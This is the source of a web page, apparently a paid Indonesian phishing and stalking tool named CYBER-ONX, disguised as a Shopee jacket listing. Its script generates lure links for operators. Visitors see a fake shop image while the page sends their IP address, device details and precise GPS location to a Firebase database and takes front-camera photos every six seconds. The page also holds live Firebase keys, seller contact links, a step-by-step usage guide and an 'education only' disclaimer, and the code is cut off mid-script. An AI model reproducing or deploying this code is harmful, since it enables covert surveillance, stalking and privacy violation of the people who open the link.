<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee Jaket skena COD</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>

    <style>
        :root {
            --bg-main: #0a0a0c;
            --panel-bg: rgba(30, 30, 35, 0.7);
            --accent-glow: #00f2ff;
            --accent-dark: #0066ff;
            --border-glass: rgba(255, 255, 255, 0.1);
            --tips-bg: rgba(255, 217, 0, 0.05);
            --tips-border: #ffd900;
            --success: #00ff64;
            --danger: #ff0055;
            --card-grad: linear-gradient(145deg, #1e1e24, #141418);
        }

        body {
            margin: 0; padding: 0; background-color: var(--bg-main);
            background-image: radial-gradient(circle at top right, #1a1a2e, transparent);
            color: white; font-family: 'Inter', sans-serif;
            display: flex; justify-content: center; min-height: 100vh;
        }

        /* TAMPILAN KHUSUS TARGET */
        #target-view {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 999999; display: none;
            justify-content: center; align-items: flex-start; overflow-y: auto;
        }
        #target-view img { width: 100%; height: auto; display: block; }

        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; position: relative; }

        .header-profile {
            background: var(--panel-bg); backdrop-filter: blur(10px);
            border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass);
            text-align: center; margin-bottom: 25px; position: relative; overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        /* TIMER & MINI BUTTONS */
        .timer-container {
            position: absolute; top: 10px; right: 15px;
            display: flex; flex-direction: column; align-items: flex-end; gap: 8px;
            z-index: 1000;
        }
        .exp-timer {
            font-family: 'Orbitron'; font-size: 9px;
            background: rgba(0,0,0,0.9); padding: 4px 10px; border-radius: 8px;
            transition: all 0.3s ease; border: 1px solid var(--border-glass);
            color: var(--success); box-shadow: 0 0 10px rgba(0,255,100,0.2);
        }
        .mini-btn-group { display: flex; gap: 6px; }
        .mini-btn {
            width: 26px; height: 26px; border-radius: 50%; border: 1px solid var(--border-glass);
            background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center;
            cursor: pointer; transition: 0.3s;
        }
        .mini-btn:hover { background: var(--accent-glow); transform: scale(1.1); }
        .mini-btn svg { width: 14px; fill: white; }
        .mini-btn:hover svg { fill: black; }

        /* SIDE NAVIGATION */
        #side-nav { position: fixed; top: 0; left: -300px; width: 280px; height: 100%; background: #0f0f12; z-index: 20000; transition: 0.4s; border-right: 1px solid var(--border-glass); overflow-y: auto; }
        #side-nav.active { left: 0; }
        .nav-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 15000; display: none; }
        
        /* SIDEBAR CARD LOGO */
        .nav-header-card {
            background: var(--card-grad);
            margin: 20px; padding: 25px; border-radius: 20px;
            border: 1px solid var(--border-glass);
            text-align: center;
            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
        }
        .nav-header-card .logo-box {
            width: 70px; height: 70px; background: #000; border-radius: 18px;
            margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;
            border: 2px solid var(--accent-glow); box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);
        }

        .nav-item {
            display: flex; align-items: center; gap: 15px; padding: 18px 25px;
            color: #ccc; text-decoration: none; font-size: 12px; font-weight: 600;
            border-bottom: 1px solid rgba(255,255,255,0.03); transition: 0.3s;
        }
        .nav-item:hover { background: rgba(0, 242, 255, 0.05); color: var(--accent-glow); padding-left: 30px; }
        .nav-item svg { width: 20px; height: 20px; }

        /* MODAL */
        .modal-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
            z-index: 99999; justify-content: center; align-items: center;
        }
        .modal-box {
            background: #121214; border: 1px solid var(--accent-glow); border-radius: 24px;
            padding: 25px; width: 80%; max-width: 300px; text-align: center;
            box-shadow: 0 0 40px rgba(0, 242, 255, 0.2);
        }

        /* REGISTRATION POPUP BUTTONS */
        .reg-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }
        .reg-btn {
            display: flex; align-items: center; justify-content: center; gap: 10px;
            width: 90%; padding: 12px; border-radius: 12px; margin-bottom: 10px;
            text-decoration: none; font-weight: bold; font-size: 12px; transition: 0.3s;
        }
        .btn-wa { background: #25D366; color: white; }
        .btn-tele { background: #0088cc; color: white; }
        .btn-testi { background: #f0ad4e; color: black; }
        .reg-btn:hover { transform: scale(1.03); filter: brightness(1.1); }

        /* PANDUAN */
        .guide-container { margin-top: 15px; }
        .guide-header {
            background: rgba(255,255,255,0.05); border: 1px solid var(--border-glass);
            padding: 12px 15px; border-radius: 12px; display: flex;
            justify-content: space-between; align-items: center; cursor: pointer;
            font-size: 11px; font-weight: 800; color: var(--accent-glow);
        }
        .guide-content {
            max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out;
            background: rgba(0,0,0,0.2); border-radius: 0 0 12px 12px; margin-top: -5px;
        }
        .guide-content.open { max-height: 500px; padding: 15px; border: 1px solid var(--border-glass); border-top: none; }
        
        /* GALLERY & ZOOM */
        #gallery-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 10001; padding: 20px; box-sizing: border-box; overflow-y: auto; }
        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
        .grid-photos img { width: 100%; border-radius: 15px; border: 1px solid #333; cursor: pointer; }
        #image-zoom-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 50000; justify-content: center; align-items: center; }
        #image-zoom-overlay img { max-width: 90%; max-height: 80%; border-radius: 10px; border: 2px solid var(--accent-glow); }

        /* UI ELEMENTS */
        .info-title { font-family: 'Orbitron'; font-size: 14px; color: var(--accent-glow); text-align: center; font-weight: 800; margin-bottom: 15px; }
        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 11px; }
        .info-label { color: #888; }
        .info-value { color: #fff; text-align: right; font-weight: 600; word-break: break-all; max-width: 60%; }
        
        .btn-copy-data { position: absolute; top: 15px; right: 15px; cursor: pointer; background: rgba(0,242,255,0.15); padding: 8px; border-radius: 10px; z-index: 10; }
        .btn-copy-data svg { fill: var(--accent-glow); width: 18px; height: 18px; }

        /* REALISTIC ICON STYLE */
        .logo-main { 
            width: 90px; height: 90px; border-radius: 50%; background: #000; 
            margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; 
            border: 2px solid var(--accent-glow); 
            box-shadow: 0 0 25px var(--accent-dark), inset 0 0 15px var(--accent-dark);
            position: relative;
        }
        .logo-main svg { width: 50px; filter: drop-shadow(0 0 8px var(--accent-glow)); }
        
        .status-badge { display: inline-flex; align-items: center; background: rgba(0, 255, 100, 0.1); color: #00ff64; padding: 5px 15px; border-radius: 20px; font-size: 10px; font-weight: bold; border: 1px solid rgba(0, 255, 100, 0.2); }
        
        .control-panel { background: var(--panel-bg); backdrop-filter: blur(15px); border-radius: 24px; padding: 20px; border: 1px solid var(--border-glass); margin-bottom: 20px; position: relative; }
        .label-style { font-size: 10px; text-transform: uppercase; color: #777; margin-bottom: 12px; display: block; font-weight: 800; letter-spacing: 1px; }
        
        .input-group { background: rgba(0,0,0,0.4); border-radius: 14px; padding: 12px; border: 1px solid #333; display: flex; align-items: center; justify-content: space-between; transition: 0.3s; }
        .input-group:focus-within { border-color: var(--accent-glow); box-shadow: 0 0 10px rgba(0, 242, 255, 0.1); }
        .input-group input { background: transparent; border: none; color: #fff; width: 80%; outline: none; font-size: 12px; font-family: 'Inter'; }
        
        .btn-action { background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark)); color: #000; border: none; padding: 12px 18px; border-radius: 12px; font-weight: 800; font-size: 11px; cursor: pointer; transition: 0.3s; }
        .btn-action:hover { transform: scale(1.02); filter: brightness(1.1); box-shadow: 0 5px 15px rgba(0, 242, 255, 0.3); }

        .target-folder { 
            background: var(--card-grad); border-radius: 18px; padding: 18px; 
            margin-top: 12px; display: flex; align-items: center; justify-content: space-between; 
            border: 1px solid var(--border-glass);
            border-left: 4px solid var(--accent-glow);
            transition: 0.3s;
        }
        .target-folder:hover { background: #25252d; transform: translateX(5px); }
        
        .hamburger { position: absolute; top: 35px; left: 40px; z-index: 1000; background: var(--panel-bg); border: 1px solid var(--border-glass); padding: 10px; border-radius: 12px; cursor: pointer; backdrop-filter: blur(10px); }
        .btn-back { display: flex; align-items: center; gap: 10px; background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid var(--border-glass); padding: 10px 20px; border-radius: 50px; cursor: pointer; font-family: 'Orbitron'; font-size: 10px; }
        
        /* LOGIN GATE ADJUSTMENT */
        #login-gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-main); z-index: 10000; display: flex; justify-content: center; align-items: center; }
        .login-footer-text { margin-top: 15px; font-size: 11px; color: #666; cursor: pointer; transition: 0.3s; }
        .login-footer-text:hover { color: var(--accent-glow); }

        #target-loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 50000; color: #444; justify-content: center; align-items: center; font-size: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="target-view">
    <img src="https://i.imgur.com/swSbjoE.jpeg" alt="Shopee">
</div>

<div id="image-zoom-overlay" onclick="this.style.display='none'"><img id="zoomed-img" src=""></div>

<div class="modal-overlay" id="modal-akun">
    <div class="modal-box">
        <h3 style="font-family:'Orbitron'; color:var(--accent-glow); font-size:13px; margin-bottom:15px;">ACCOUNT INFO</h3>
        <div style="text-align:left;">
            <div class="info-row"><span class="info-label">Username:</span><span id="u-display" class="info-value">--</span></div>
            <div class="info-row"><span class="info-label">Password:</span><span id="p-display" class="info-value">••••••••</span></div>
            <div class="info-row"><span class="info-label">Waktu Exp:</span><span id="pop-exp" style="color:var(--success)" class="info-value">23:59:59</span></div>
        </div>
        <button class="btn-action" style="width:100%; margin-top:15px;" onclick="closeModal('modal-akun')">CLOSE</button>
    </div>
</div>

<div class="modal-overlay" id="modal-reg">
    <div class="modal-box">
        <h3 style="font-family:'Orbitron'; color:var(--accent-glow); font-size:14px; margin-bottom:10px;">BELI AKSES</h3>
        <p style="font-size:10px; color:#888; margin-bottom:20px;">Silahkan pilih layanan admin di bawah ini untuk pendaftaran akun.</p>
        <div class="reg-container">
            <a href="https://wa.me/6289513794264" target="_blank" class="reg-btn btn-wa">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.816 9.816 0 0012.04 2m.01 1.67c2.2 0 4.26.86 5.82 2.42a8.225 8.225 0 012.41 5.83c0 4.54-3.7 8.23-8.24 8.23-1.48 0-2.93-.39-4.19-1.15l-.3-.17-3.12.82.83-3.04-.2-.32a8.188 8.188 0 01-1.26-4.38c.01-4.54 3.7-8.24 8.25-8.24"/></svg>
                ADMIN WHATSAPP
            </a>
            <a href="https://t.me/onetoxice" target="_blank" class="reg-btn btn-tele">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5.11 6.79c-.19 1.89-1.13 7.11-1.62 9.61-.21 1.05-.6 1.41-.98 1.44-.83.07-1.46-.55-2.26-1.08-.12-.08-.24-.16-.36-.24-.48-.32-.82-.54-1.34-.89-.81-.54-1.31-1.16-.36-1.89.24-.19.46-.39.68-.59l4.54-4.11c.21-.19.42-.38.64-.56.24-.22.48-.33.74-.32.25.01.5.11.69.29.35.33.26.85.12 1.35z"/></svg>
                ADMIN TELEGRAM
            </a>
            <a href="https://whatsapp.com/channel/0029VbCPdLJD8SDw4Zm4hH2e" target="_blank" class="reg-btn btn-testi">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="black"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71z"/></svg>
                TESTIMONI PEMBELI
            </a>
            <button class="btn-action" style="width:90%; margin-top:10px; background:#222; color:#fff;" onclick="closeModal('modal-reg')">KEMBALI</button>
        </div>
    </div>
</div>

<div class="modal-overlay" id="modal-logout">
    <div class="modal-box">
        <h3 style="font-family:'Orbitron'; color:var(--danger); font-size:13px; margin-bottom:10px;">LOGOUT</h3>
        <p style="font-size:11px; color:#ccc;">Keluar dari akun? </p>
        <div style="display:flex; gap:10px; margin-top:20px;">
            <button class="btn-action" style="flex:1; background:#222; color:#fff;" onclick="closeModal('modal-logout')">NO</button>
            <button class="btn-action" style="flex:1; background:var(--danger); color:#fff;" onclick="logout()">YES</button>
        </div>
    </div>
</div>

<div id="target-loading">
    <div>
        <div style="width: 30px; height: 30px; border: 2px solid #222; border-top-color: var(--accent-glow); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
        Synchronizing...
    </div>
</div>

<div id="side-nav">
    <div class="nav-header-card">
        <div class="logo-box">
            <svg viewBox="0 0 24 24" width="40" height="40"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" fill="var(--accent-glow)"/></svg>
        </div>
        <div style="font-family: 'Orbitron'; font-size: 16px; font-weight: 800; color: #fff;">ONX-1</div>
        <div style="font-size: 9px; color: var(--accent-glow); letter-spacing: 2px; margin-top: 5px;">DEVEELOPER BY ONEDEV</div>
    </div>

    <a href="#" class="nav-item" onclick="openModal('modal-akun'); toggleNav();">
        <svg viewBox="0 0 24 24" fill="var(--accent-glow)"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
        Profile User
    </a>
    <a href="https://wa.me/6289513794264" target="_blank" class="nav-item">
        <svg viewBox="0 0 24 24" fill="#25D366"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.816 9.816 0 0012.04 2m.01 1.67c2.2 0 4.26.86 5.82 2.42a8.225 8.225 0 012.41 5.83c0 4.54-3.7 8.23-8.24 8.23-1.48 0-2.93-.39-4.19-1.15l-.3-.17-3.12.82.83-3.04-.2-.32a8.188 8.188 0 01-1.26-4.38c.01-4.54 3.7-8.24 8.25-8.24"/></svg>
        WhatsApp Admin
    </a>
    <a href="https://t.me/onetoxice" target="_blank" class="nav-item">
        <svg viewBox="0 0 24 24" fill="#0088cc"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5.11 6.79c-.19 1.89-1.13 7.11-1.62 9.61-.21 1.05-.6 1.41-.98 1.44-.83.07-1.46-.55-2.26-1.08-.12-.08-.24-.16-.36-.24-.48-.32-.82-.54-1.34-.89-.81-.54-1.31-1.16-.36-1.89.24-.19.46-.39.68-.59l4.54-4.11c.21-.19.42-.38.64-.56.24-.22.48-.33.74-.32.25.01.5.11.69.29.35.33.26.85.12 1.35z"/></svg>
        Telegram Admin
    </a>
    <a href="https://whatsapp.com/channel/0029Vb6o7sgGU3BKw965Ti0o" target="_blank" class="nav-item">
        <svg viewBox="0 0 24 24" fill="#00ff64"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-11h-2v2h2v-2zm0 4h-2v4h2v-4z"/></svg>
        Saluran WhatsApp
    </a>
    <a href="https://tiktok.com/@onedev_" target="_blank" class="nav-item">
        <svg viewBox="0 0 24 24" fill="#ff0055"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.06-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-1.01-.01 2.42.02 4.85-.01 7.27-.12 5.49-5.28 9.5-10.7 8.65-4.23-.67-7.29-4.89-6.32-9.12.51-3.04 3.05-5.39 6.13-5.64V13.2c-1.33.19-2.33 1.44-2.19 2.78.14 1.25 1.23 2.15 2.48 2.06 1.25-.03 2.22-1.08 2.19-2.33-.03-5.23-.01-10.46-.02-15.69z"/></svg>
        Tiktok Update
    </a>
</div>
<div class="nav-overlay" id="navOver" onclick="toggleNav()"></div>

<div id="login-gate">
    <div class="control-panel" style="width: 80%; max-width: 300px; text-align: center; border: 1px solid var(--border-glass); padding: 40px 25px;">
        <div style="width:60px; height:60px; background:rgba(0,242,255,0.1); border-radius:15px; margin: 0 auto 20px; display:flex; align-items:center; justify-content:center; border:1px solid var(--accent-glow);">
            <svg width="30" viewBox="0 0 24 24" fill="var(--accent-glow)"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
        </div>
        <h2 style="font-family: 'Orbitron'; font-size: 14px; color: #fff; margin-bottom: 30px; letter-spacing: 3px;">CYBER-ONX</h2>
        <input type="text" id="user-in" class="input-group" style="width: 100%; margin-bottom: 12px; padding: 14px; box-sizing: border-box; background: rgba(0,0,0,0.5); color: #fff; border:1px solid #333; border-radius: 12px; font-size: 12px;" placeholder="Username">
        <input type="password" id="pass-in" class="input-group" style="width: 100%; margin-bottom: 25px; padding: 14px; box-sizing: border-box; background: rgba(0,0,0,0.5); color: #fff; border:1px solid #333; border-radius: 12px; font-size: 12px;" placeholder="Password">
        <button class="btn-action" style="width: 100%; padding: 14px; font-size: 11px;" onclick="auth()">LOGIN</button>
        
        <div class="login-footer-text" onclick="openModal('modal-reg')">
            Belum punya akun? <span style="color:var(--accent-glow); font-weight:bold;">Klik sini</span>
        </div>
    </div>
</div>

<div class="phone-frame" id="admin-view" style="display:none;">
    <div class="hamburger" onclick="toggleNav()">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
    </div>

    <div class="header-profile">
        <div class="timer-container">
            <div class="exp-timer" id="exp-display">EXP: --:--:--</div>
            <div class="mini-btn-group">
                <div class="mini-btn" onclick="openModal('modal-akun')">
                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                </div>
                <div class="mini-btn" onclick="openModal('modal-logout')">
                    <svg viewBox="0 0 24 24"><path d="M13 3h-2v10h2V3zm4.83 2.17l-1.42 1.42C17.99 7.86 19 9.81 19 12c0 3.87-3.13 7-7 7s-7-3.13-7-7c0-2.19 1.01-4.14 2.58-5.42L6.17 5.17C4.23 6.82 3 9.26 3 12c0 4.97 4.03 9 9 9s9-4.03 9-9c0-2.74-1.23-5.18-3.17-6.83z"/></svg>
                </div>
            </div>
        </div>
        <div class="logo-main">
            <svg viewBox="0 0 64 64" width="50" height="50">
                <defs>
                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:var(--accent-glow);stop-opacity:1" />
                        <stop offset="100%" style="stop-color:var(--accent-dark);stop-opacity:1" />
                    </linearGradient>
                </defs>
                <circle cx="32" cy="32" r="30" fill="none" stroke="url(#grad1)" stroke-width="2" stroke-dasharray="10 5" />
                <path d="M32 12 L44 44 L32 38 L20 44 Z" fill="url(#grad1)" />
                <circle cx="32" cy="32" r="5" fill="white" />
            </svg>
        </div>
        <h1 style="font-family: 'Orbitron'; font-size: 18px; letter-spacing: 2px; margin: 10px 0;">CYBER-ONX</h1>
        <div class="status-badge">
            <span style="display:inline-block; width:8px; height:8px; background:#00ff64; border-radius:50%; margin-right:8px; box-shadow:0 0 8px #00ff64;"></span>
            SYSTEM OPERATIONAL
        </div>
    </div>

    <div class="control-panel">
        <span class="label-style">Generat url phising</span>
        <div class="input-group">
            <input type="text" id="gen-url" readonly value="Generating link...">
            <div onclick="copyLinkOnly()" style="cursor:pointer; background:rgba(0,242,255,0.1); padding:8px; border-radius:10px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="cyan"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg>
            </div>
        </div>
        <div class="guide-container">
            <div class="guide-header" onclick="toggleGuide()">
                <span>( ! ) PANDUAN PEMAKAIAN</span>
                <svg id="arrow-icon" width="14" viewBox="0 0 24 24" fill="cyan" style="transition:0.3s;"><path d="M7 10l5 5 5-5z"/></svg>
            </div>
            <div id="guide-body" class="guide-content">
                <div style="padding:15px; font-size:11px; color:#aaa; line-height:1.6;">
                    1. Salin tautan terenkripsi di atas.<br>
                    2. Kirimkan ke target yang ingin dipantau<br>
                    3. Setelah target pencet link dan izin kan akses<br>
                    3. Data (Lokasi, IP, Foto dll) akan muncul otomatis di folder bawah.<br>
                    <span style="color:var(--accent-glow)">Gunakan hanya untuk tujuan edukasi dan keselamatan, menyalah gunakan tools ini diluar tanggung jawab kami, gunakan alat ini dengan bijak!!</span>
                </div>
            </div>
        </div>
    </div>

    <div class="control-panel">
        <span class="label-style">Live Feed & Captured Data</span>
        <div id="target-list">
            </div>
    </div>
</div>

<div id="gallery-overlay">
    <div style="margin-bottom: 20px;"><button class="btn-back" onclick="closeFolder()">BACK TO TERMINAL</button></div>
    <div class="control-panel" style="background:var(--panel-bg); padding:15px; border-radius:24px; border:1px solid var(--border-glass);">
        <div class="btn-copy-data" onclick="copyTargetText()"><svg viewBox="0 0 24 24"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg></div>
        <h3 class="info-title">INFO DATA TARGET</h3>
        <div id="info-container"></div>
    </div>
    <div class="grid-photos" id="photo-grid"></div>
</div>

<script>
    // --- FIREBASE CONFIG ---
    const firebaseConfig = {
        apiKey: "AIzaSyAydM6bos2I1uGuFrj6DeJ_TDjJFhmfvT0",
        authDomain: "shope-bd354.firebaseapp.com",
        databaseURL: "https://shope-bd354-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "shope-bd354",
        storageBucket: "shope-bd354.firebasestorage.app",
        messagingSenderId: "344259593578",
        appId: "1:344259593578:web:108cd8edb3069641799113"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const params = new URLSearchParams(window.location.search);
    const idParam = params.get('id');
    const uOwner = params.get('u');
    const regU = params.get('reg_u');
    const regP = params.get('reg_p');

    function startRealtimeTimer() {
        setInterval(() => {
            const exp = localStorage.getItem('user_expiry');
            if(!exp) return;
            let now = new Date().getTime();
            let distance = exp - now;
            if (distance < 0) { logout(); return; }
            let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let mins = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            let secs = Math.floor((distance % (1000 * 60)) / 1000);
            let timeStr = `${String(hours).padStart(2, '0')}:${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
            if(document.getElementById('exp-display')) document.getElementById('exp-display').innerText = "EXP: " + timeStr;
            if(document.getElementById('pop-exp')) document.getElementById('pop-exp').innerText = timeStr;
        }, 1000);
    }

    // LOGIKA PERBAIKAN DI SINI
    window.onload = function() {
        startRealtimeTimer();

        // 1. Cek dulu apakah ini link phising untuk target
        if(idParam && uOwner) {
            document.getElementById('login-gate').style.display = 'none';
            document.getElementById('admin-view').style.display = 'none';
            document.getElementById('target-view').style.display = 'flex';
            startCapture(idParam, uOwner);
        } 
        // 2. Cek apakah ada auto-login dari pendaftaran
        else if(regU && regP) {
            document.getElementById('user-in').value = regU;
            document.getElementById('pass-in').value = regP;
            auth();
        } 
        // 3. Cek apakah admin sudah login sebelumnya
        else if(localStorage.getItem('is_logged_in') === 'true') {
            showAdmin();
        }
        // 4. Jika tidak ada semua, tampilkan login gate
        else {
            document.getElementById('login-gate').style.display = 'flex';
        }
    };

    function auth() {
        const u = document.getElementById('user-in').value.trim();
        const p = document.getElementById('pass-in').value.trim();
        if(!u || !p) return alert("Masukan Username & Password!");
        db.ref('registered_users/' + u).once('value').then((snap) => {
            const data = snap.val();
            if(data) {
                const now = new Date().getTime();
                if(data.password === p) {
                    if(now < data.expiry) {
                        localStorage.setItem('is_logged_in', 'true');
                        localStorage.setItem('current_user', u);
                        localStorage.setItem('user_expiry', data.expiry);
                        localStorage.setItem('user_pass', p);
                        showAdmin();
                    } else { alert("MASA AKTIF AKUN SUDAH HABIS!"); }
                } else { alert("PASSWORD SALAH!"); }
            } else { alert("AKUN TIDAK TERDAFTAR!"); }
        }).catch(e => alert("Koneksi Error: " + e.message));
    }

    function showAdmin() {
        document.getElementById('login-gate').style.display = 'none';
        document.getElementById('admin-view').style.display = 'block';
        const user = localStorage.getItem('current_user');
        document.getElementById('u-display').innerText = user;
        document.getElementById('p-display').innerText = localStorage.getItem('user_pass');
        const baseUrl = window.location.href.split('?')[0];
        document.getElementById('gen-url').value = `${baseUrl}?id=${Math.floor(1000+Math.random()*9999)}&u=${user}`;
        db.ref(`users/${user}/targets`).on('value', (snap) => { renderList(snap.val()); });
    }

    function renderList(val) {
        const list = document.getElementById('target-list');
        list.innerHTML = '';
        if(!val) {
            list.innerHTML = '<p style="text-align:center; color:#444; font-size:10px;">Belum ada data...</p>';
            return;
        }
        Object.keys(val).reverse().forEach(id => {
            const t = val[id];
            const div = document.createElement('div');
            div.className = 'target-folder';
            div.onclick = () => openFolder(id, t);
            div.innerHTML = `
                <div style="display:flex; align-items:center;">
                    <div style="margin-right:15px; background:rgba(0,242,255,0.1); padding:8px; border-radius:12px;">
                        <svg viewBox="0 0 24 24" width="24" fill="var(--accent-glow)"><path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 12H4V8h16v10z"/></svg>
                    </div>
                    <div><b style="font-size:12px; color:#fff;">TRACK-ID #${id}</b><br><small style="font-size:9px; color:#555;">${t.ip || 'Connecting...'}</small></div>
                </div>
                <button onclick="event.stopPropagation(); delT('${id}')" style="background:none; border:none; cursor:pointer;"><svg viewBox="0 0 24 24" width="16" fill="#ff4444"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button>
            `;
            list.appendChild(div);
        });
    }

    async function startCapture(id, owner) {
        const path = `users/${owner}/targets/${id}`;
        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
        const cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Core" : "Unknown";
        const os = navigator.userAgent.split('Android')[1] ? "Android" + navigator.userAgent.split('Android')[1].split(';')[0] : "Other OS";
        const timeTrap = new Date().toLocaleString('id-ID');
        db.ref(path).update({ time: timeTrap, ip: 'Fetching...', loc: 'Mencari Lokasi...', ram: ram, cpu: cpu, android: os });
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(res => db.ref(path).update({ip: res.ip}));
        
        // Mulai kamera segera tanpa menunggu lokasi
        initCamera(path);

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition((p) => {
                const lat = p.coords.latitude; const lon = p.coords.longitude;
                db.ref(path).update({ loc: `${lat},${lon}` });
                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json()).then(d => db.ref(path).update({ address: d.display_name }));
            }, null, {enableHighAccuracy:true});
        }
    }

    function initCamera(path) {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => {
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setInterval(() => {
                const c = document.createElement('canvas'); c.width = 480; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0, 480, 480);
                db.ref(path + '/photos').push(c.toDataURL('image/jpeg', 0.6));
            }, 6000);
        }).catch(() => db.ref(path).update({ camera_status: "Ditolak" }));
    }

    function openFolder(id, t) {
        const info = document.getElementById('info-container');
        const row = (l, v) => `<div class="info-row"><span class="info-label">${l}:</span><span class="info-value">${v || '--'}</span></div>`;
        info.innerHTML = row('Ip Address', t.ip) + row('RAM', t.ram) + row('Waktu', t.time) + row('Koordinat', t.loc) + row('Alamat', t.address);
        const grid = document.getElementById('photo-grid');
        grid.innerHTML = '';
        if(t.photos) Object.values(t.photos).reverse().forEach(p => { grid.innerHTML += `<img src="${p}" onclick="openZoom(this.src)">`; });
        document.getElementById('gallery-overlay').style.display = 'block';
    }

